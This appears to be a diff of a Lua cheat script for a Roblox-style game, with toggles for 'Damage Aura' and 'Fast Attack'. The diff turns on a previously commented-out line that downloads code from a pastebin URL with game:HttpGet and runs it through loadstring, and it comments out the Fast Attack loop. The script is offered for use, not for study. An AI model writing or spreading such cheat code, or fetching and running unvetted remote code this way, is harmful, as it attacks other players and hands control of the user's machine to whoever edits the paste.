@@ -10873,7 +10873,7 @@ row:Right():Toggle({
         getgenv()['Update_Setting'](getgenv()['MyName'])
     end,
 })
---[[ loadstring(game:HttpGet("https://pastebin.com/raw/Vtjx3jJE"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/Vtjx3jJE"))()
 spawn(function()
     while wait() do
         pcall(function()
@@ -10887,7 +10887,7 @@ spawn(function()
             end
         end)
     end
-end) *]]
+end)
 row = titledRow(form, "Damage Aura","for attack players")
 row:Right():Toggle({
     Value = Config["Damage Aura"] or false,
@@ -10897,7 +10897,7 @@ row:Right():Toggle({
         getgenv()['Update_Setting'](getgenv()['MyName'])
     end,
 })
-spawn(function()
+--[[ spawn(function()
     while task.wait() do
         if _G['Fast Attack'] then
             pcall(function()
@@ -10924,7 +10924,7 @@ spawn(function()
             end)
         end
     end
-end)
+end) *]]
 spawn(function()
     while task.wait() do
         if _G['Damage Aura'] then
